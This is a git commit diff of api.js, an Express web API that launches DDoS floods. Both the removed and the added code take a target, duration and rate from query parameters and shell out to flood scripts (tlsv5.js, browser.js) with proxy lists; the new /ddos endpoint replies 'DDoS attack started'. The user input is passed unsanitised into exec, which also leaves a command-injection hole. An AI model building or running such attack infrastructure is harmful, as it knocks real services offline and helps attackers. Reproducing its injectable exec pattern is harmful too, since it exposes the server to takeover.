b69a5064246df42e560720457a6db27460aa720d
GunturBhizer <107355442+GunturBhizer@users.noreply.github.com>
2023-09-19 15:58:01 +0700

    Update api.js

--- api.js
+++ api.js
@@ -1,92 +1,29 @@
 const express = require('express');
-const app = express();
-const port = process.env.PORT || 3000;
-const key = "@narul1";
 const { exec } = require('child_process');
 
-app.get('/', (req, res) => {
-  try {
-    const host = req.query.host;
-    const time = req.query.time;
-    const method = req.query.method;
-    const requests = req.query.requests;
+const app = express();
 
-    if (req.query.key !== key) {
-      return res.status(401).send('Key not working');
+app.get('/ddos', (req, res) => {
+  const target = req.query.target || 'example.com';
+  const duration = req.query.duration || 10;
+  const rate = req.query.rate || 100;
+
+  const command = `node tlsv5.js ${target} ${duration} ${rate} 25 p.txt `;
+
+  exec(command, (error, stdout, stderr) => {
+    if (error) {
+      console.error(`exec error: ${error}`);
+      res.send('Failed to start DDoS attack');
+      return;
     }
 
-    if (method === 'https-tls') {
-      const command = `node tlsv5 ${host} ${time} 100 10 p.txt`;
-      const ls = exec(command);
+    console.log(`stdout: ${stdout}`);
+    console.error(`stderr: ${stderr}`);
 
-      ls.stdout.on('data', (data) => {
-        console.log(`stdout: ${data}`);
-      });
-
-      ls.stderr.on('data', (data) => {
-        console.error(`stderr: ${data}`);
-      });
-
-      ls.on('close', (code) => {
-        console.log(`child process exited with code ${code}`);
-        if (code === 0) {
-          const html = `
-            <html>
-              <body>
-                <h1>Request sent successfully</h1>
-                <p>Host: ${host}</p>
-                <p>Time: ${time}</p>
-                <p>Method: ${method}</p>
-              </body>
-            </html>
-          `;
-          res.send(html);
-        } else {
-          console.error('An error occurred during the execution of the process.');
-          res.status(500).send('An error occurred during the execution of the process.');
-        }
-      });
-    } else if (method === 'https-browser') {
-      const command = `node browser.js ${host} ${time} ${requests} ${thread} proxies.txt`;
-      const ls = exec(command);
-
-      ls.stdout.on('data', (data) => {
-        console.log(`stdout: ${data}`);
-      });
-
-      ls.stderr.on('data', (data) => {
-        console.error(`stderr: ${data}`);
-      });
-
-      ls.on('close', (code) => {
-        console.log(`child process exited with code ${code}`);
-        if (code === 0) {
-          const html = `
-            <html>
-              <body>
-                <h1>Request sent successfully</h1>
-                <p>Host: ${host}</p>
-                <p>Time: ${time}</p>
-                <p>Method: ${method}</p>
-              </body>
-            </html>
-          `;
-          res.send(html);
-        } else {
-          console.error('An error occurred during the execution of the process.');
-          res.status(500).send('An error occurred during the execution of the process.');
-        }
-      });
-    } else {
-      console.error('Incorrect method.');
-      res.status(400).send('Incorrect method.');
-    }
-  } catch (error) {
-    console.error(error);
-    res.status(500).send('There is a problem.');
-  }
+    res.send('DDoS attack started');
+  });
 });
 
-app.listen(port, () => {
-  console.log(`API working on ${port} port`);
+app.listen(3000, () => {
+  console.log('Server started on port 3000');
 });
